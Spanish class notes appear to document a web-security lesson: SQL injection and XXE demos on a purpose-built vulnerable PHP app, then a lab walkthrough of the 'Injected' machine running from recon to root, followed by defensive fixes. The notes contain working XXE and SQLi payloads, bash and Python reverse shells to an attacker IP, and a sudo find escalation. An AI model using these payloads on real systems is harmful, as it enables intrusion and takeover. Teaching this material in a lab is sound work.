## ① Una página web es una carpeta expuesta en un servidor

### El concepto central

Carlos lo materializó creando en directo el proyecto **CiberLab** con esta estructura:

```
/var/www/html/ciberlab/
│”œ── public/ → raíz de la URL
│ │”œ── index.php
│ │”œ── assets/
│ │”œ── includes/
│ ┘── uploads/
┘── data/ → base de datos, NUNCA expuesta
 ┘── db.sqlite
```

| Directorio | ¿Qué es? | ¿Accesible desde URL? |
|------------|----------|----------------------|
| `public/` | Document root, contiene index.php, assets, includes, uploads | **SÍ** (es la raíz) |
| `data/` | Base de datos SQLite, ficheros sensibles | **NO** (mismo nivel que public, pero no servida) |

> [!important] La arquitectura de seguridad por diseño
> `public` y `data` están al mismo nivel jerárquico bajo `ciberlab`, pero Apache solo sirve `public`. Desde la URL solo puedes navegar **hacia adelante** (assets, includes, uploads). Para llegar a `data` hay que subir un nivel (`../`), lo cual **solo es posible si existe una vulnerabilidad de Path Traversal**.

> [!important] Lo que el servidor expone no son "pestañas"
> Son **ficheros PHP**. Cada URL diferente = un fichero PHP distinto. La barra de navegación del front solo contiene enlaces a esos ficheros.

### ¿Qué hace vulnerable a una web?

> [!warning] La regla de oro
> **Lo vulnerable no es el servidor, ni el puerto, ni la base de datos, ni el front.**
> Lo vulnerable son **los ficheros PHP** €” lo que programan las personas y donde se introducen errores de validación.

| Funcionalidad | Fichero PHP detrás | Qué hace | Vulnerabilidad típica si no valida |
|---------------|-------------------|----------|-----------------------------------|
| Login | `login.php` | Consulta SQL a BD para verificar credenciales | SQL Injection |
| Trabaja con nosotros | `trabaja.php` | Acepta XML y lo procesa | XXE |
| Subida de ficheros | `upload.php` | Recibe fichero y lo guarda en uploads/ | File Upload Bypass → RCE |

> [!important] La metáfora del portero
> "El programador es como el portero del banco. El cliente no ataca la caja fuerte directamente, ataca al portero. Si el portero (el PHP) no tiene instrucciones claras de qué no dejar pasar, cualquiera puede entrar."

## ② Qué hay detrás de cada funcionalidad

El front **no hace nada**: es HTML y CSS, no tiene backend. Los botones que no llevan a ningún lado son "cartón piedra". La comunicación real solo ocurre al llamar a un fichero PHP.

### Las 3 funcionalidades críticas y su PHP

```
Login (login.php):
 Input: username, password (POST)
 Query: SELECT id, username FROM users WHERE username='$u' AND password='$p'
 Vuln: Concatenación directa → SQL Injection

Trabaja con nosotros (trabaja.php):
 Input: XML candidatura (POST)
 Proceso: libxml_load_string() sin disable entity loader
 Vuln: External Entity habilitado → XXE

Subida CV (upload.php):
 Input: fichero (POST multipart)
 Proceso: move_uploaded_file() a uploads/
 Vuln: Sin validar extensión/MIME → RCE
```

> [!important] Mitigaciones en el código
> - **SQLi:** Prepared statements (separan código SQL de datos)
> - **XXE:** `libxml_disable_entity_loader(true)` antes de parsear
> - **File Upload:** Validar extensión, MIME, renombrar, no ejecutar en uploads/

## ③ XXE demostrado en la aplicación propia

En `trabaja.php` hay un formulario que acepta candidatura en XML. El código:

```php
$xml = simplexml_load_string($cv_xml); // Sin disable_entity_loader!
// Extrae nombre, puesto, mensaje del XML
```

**Payload XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<candidatura>
 <nombre>&xxe;</nombre>
 <puesto>hacker</puesto>
 <mensaje>test</mensaje>
</candidatura>
```

**Resultado:** El servidor devuelve `/etc/passwd` en la respuesta (el contenido del XML procesado).

> [!important] Mitigación
> ```php
> libxml_disable_entity_loader(true); // Antes de simplexml_load_string()
> ```
> Impide que el parser XML resuelva entidades externas. Sin esta línea, cualquier fichero accesible por `www-data` es legible desde fuera.

## ④ SQL Injection demostrado en la aplicación propia

En `login.php` la query se construye concatenando:

```php
$query = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
```

**Payload clásico:**

```
Usuario: admin' OR '1'='1' --
Password: (cualquier cosa)
```

**Query resultante:**

```sql
SELECT id, username FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
-- El comentario -- anula la comprobación de password
```

**Resultado:** Acceso como primer usuario de la tabla (normalmente admin).

> [!important] Prepared statements = solución real
> ```php
> $stmt = $pdo->prepare("SELECT id, username FROM users WHERE username=? AND password=?");
> $stmt->execute([$username, $password]);
> ```
> Separan código SQL de datos → imposible que la entrada modifique la estructura de la query.

## ⑤ Máquina Injected €” Reconocimiento

### Ficha técnica

| Dato | Valor |
|------|-------|
| **Máquina** | Injected (HackerLab) |
| **IP** | 10.0.2.12 |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4 Debian) |
| **Vector inicial** | Enumeración directorios → backup.php con credenciales MD5 |
| **Acceso** | admin / qwerty (hash crackeado) |
| **RCE** | Panel admin → ejecución de comandos |
| **Escalada** | sudo -l → find como cualquier usuario sin password |

### Paso 1: Netdiscover + Ping + Nmap

```bash
sudo netdiscover -r 10.0.2.0/24
# IP .12 encontrada

ping 10.0.2.12
# TTL 64 → Linux

nmap -sCV -p- --min-rate 1500 10.0.2.12
# 22/tcp SSH
# 80/tcp HTTP Apache 2.4.x (Debian)
```

### Paso 2: Dirsearch con extensiones y diccionario ampliado

```bash
# Dirsearch por defecto NO incluye "backup" en su diccionario
dirsearch -u http://10.0.2.12 -e php,html,txt,zip,sql,bak,old,backup

# O con diccionario grande
dirsearch -u http://10.0.2.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

| Hallazgo | Qué es |
|----------|--------|
| `login.php` | Panel de login |
| `backup.php` | **Clave** €” muestra mensaje "backup comprometido" + ruta a credentials/ |

### Paso 3: backup.php → Credenciales hardcodeadas

El código fuente de `backup.php` revela un directorio `credentials/` con un fichero HTML que contiene un hash:

```
Hash: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Análisis del hash:**
- Solo caracteres `a-f` y `0-9` → **hexadecimal**
- Longitud 32 → **MD5**
- Confirmado con CyberChef (Magic) → `qwerty`

> [!tip] Identificar hashes a ojo
> | Caracteres | Longitud | Tipo probable |
> |------------|----------|---------------|
> | a-f, 0-9 | 32 | MD5 |
> | a-f, 0-9 | 40 | SHA1 |
> | a-z, A-Z, 0-9, +, /, = | Variable | Base64 |
> | $2a$, $2b$, $2y$ | 60 | bcrypt |

**Credenciales:** `admin` / `qwerty` → Acceso al panel de administración.

## ⑥ RCE desde el panel y obtención de shell

### Panel de administración

El panel tiene una funcionalidad explícita: **"Ejecutar comandos en el sistema"**.

```bash
whoami
# www-data

cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# nolen:x:1000:1000:nolen,,,:/home/nolen:/bin/bash
```

Usuarios con shell real: `root` y `nolen`.

### Reverse shell

```bash
# Atacante
nc -lvnp 4444

# Panel (campo comando)
bash -c 'bash -i >& /dev/tcp/10.10.14.195/4444 0>&1'
# O payload Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Estabilización TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## ⑦ Escalada de privilegios €” sudo con find

### sudo -l como nolen

```bash
$ sudo -l
User nolen may run the following commands on Injected:
 (ALL) NOPASSWD: /usr/bin/find
```

> [!important] Distinción conceptual fijada en clase
> | Origen | Qué da | Técnica GTFOBins |
> |--------|--------|------------------|
> | `sudo -l` | Permiso delegado: "este usuario puede ejecutar este binario como otro usuario" | Pestaña **Sudo** |
> | `find / -perm -4000` | SUID bit en el fichero: "cualquiera que lo ejecute lo hace como root" | Pestaña **SUID** |
> 
> **El mismo binario (find) tiene dos caminos de explotación distintos según CÃ“MO se descubrió.**

### GTFOBins → find → Sudo

Payload:

```bash
sudo find . -exec /bin/sh \; -quit
```

**Resultado:** Shell como **root**.

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## ⑨ Conceptos transversales reforzados

### Diccionarios y enumeración

> [!warning] El diccionario por defecto NO basta
> - `dirsearch` por defecto no incluye "backup"
> - `gobuster`/`feroxbuster` igual
> - **Solución:** Usar `directory-list-2.3-medium.txt` de SecLists o añadir palabras clave del contexto

### Identificación de hashes

| Hash | Charset | Longitud | Ejemplo |
|------|---------|----------|---------|
| **MD5** | a-f, 0-9 | 32 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SHA1 | a-f, 0-9 | 40 | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| SHA256 | a-f, 0-9 | 64 | `e3b0c44298fc1c149afbf4c8996fb924...` |
| bcrypt | $2a$/b/y$... | 60 | `$2b$12$...` |

**Herramienta:** CyberChef (Magic) → identifica y crackea automáticamente.

### Reverse shell TTY

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background + raw mode
Ctrl+Z
stty raw -echo; fg

# 3. Restore
export TERM=xterm
stty rows 50 cols 150
```

### Sudo vs SUID €” la distinción clave

```
sudo -l → "yo, usuario X, puedo ejecutar binario Y como usuario Z"
 → GTFOBins pestaña SUDO

find -perm -4000 → "el binario Y tiene bit SUID, cualquiera lo ejecuta como root"
 → GTFOBins pestaña SUID
```

> [!important] Mismo binario, vector diferente
> `find` descubierto via `sudo -l` → técnica `sudo find . -exec /bin/sh \;`
> `find` descubierto via `find -perm -4000` → técnica `find . -exec /bin/sh \;` (sin sudo)

## ⑪ Mitigaciones Blue Team vistas en clase

### XXE (PHP)

```php
// ANTES de parsear XML
libxml_disable_entity_loader(true);

// O en PHP 8+ con opciones de parser
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // ¡PELIGROSO!
// Seguro:
$dom->loadXML($xml, LIBXML_NONET); // Sin red, sin entities externas
```

### SQL Injection (PHP)

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE user='$u' AND pass='$p'";

// SEGURO - Prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE user=? AND pass=?");
$stmt->execute([$u, $p]);
```

### Path Traversal / LFI

```php
// VULNERABLE
readfile("uploads/" . $_GET['file']);

// SEGURO - Rutas absolutas hardcodeadas
$allowed = ['doc1.pdf', 'doc2.pdf'];
if (in_array($_GET['file'], $allowed)) {
 readfile("/var/www/uploads/" . $_GET['file']);
}
```

### File Upload

```php
// Validaciones mínimas
$allowed_ext = ['pdf', 'jpg', 'png'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $allowed_ext)) die("Extensión no permitida");

// Renombrar para evitar ejecución
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$new_name");

// Configurar Apache: uploads/ sin ejecución PHP
# <Directory /var/www/uploads>
# php_admin_flag engine off
# </Directory>
```
